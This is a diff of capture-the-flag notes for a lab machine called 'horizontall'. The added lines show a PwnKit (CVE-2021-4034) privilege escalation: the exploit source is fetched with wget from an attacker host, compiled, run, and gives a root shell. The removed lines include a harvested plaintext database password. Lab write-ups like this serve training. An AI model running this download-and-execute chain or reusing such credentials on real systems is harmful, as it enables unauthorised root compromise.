@@ -80,41 +80,25 @@ cat user.txt
 a1fe246f1ea84768e5f8c0e7d6843c88
 
 
-[+]PRIVILAGE ESCALATION[+]
+[+]PRIVILAGE ESCALATION[+] CVE-2021-4034 - Pkexec Local Privilege Escalation
 linpeas.sh
 
-- Useful software
+- Uname -a 
+Linux horizontall 4.15.0-154-generic > Vulnerable To : Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalation
 
-/usr/bin/base64
-/usr/bin/curl
+- Useful software
 /usr/bin/g++
 /usr/bin/gcc
-/usr/bin/lxc
-/usr/bin/make
-/bin/nc
-/bin/netcat
-/usr/bin/perl
-/usr/bin/php
-/bin/ping
-/usr/bin/python
-/usr/bin/python2
-/usr/bin/python2.7
-/usr/bin/python3
-/usr/bin/python3.6
-/usr/bin/sudo
-/usr/bin/wget
+/usr/bin/pkexec
 
+[+]PwnKit
+strapi@horizontall:/dev/shm$ wget http://10.10.14.15/PwnKit.c
+strapi@horizontall:/dev/shm$ chmod +x PwnKit.c
+strapi@horizontall:/dev/shm$ gcc -shared PwnKit.c -o PwnKit -Wl,-e,entry -fPIC
+strapi@horizontall:/dev/shm$ ./PwnKit
 
-- Credentials
--rw-rw-r-- 1 strapi strapi 351 May 26  2021 /opt/strapi/myapi/config/environments/development/database.json
+root@horizontall:/dev/shm# id
+uid=0(root) gid=0(root) groups=0(root),1001(strapi)
 
-        "client": "mysql",
-        "database": "strapi",
-        "host": "127.0.0.1",
-        "port": 3306,
-        "username": "developer",
-        "password": "#J!:F9Zt2u"
-        
-- UserPivoting
-
-+ Next target : developer
+root@horizontall:/dev/shm# cat /root/root.txt 
+b9ce0abad0affbb394806fcf4c3b297d
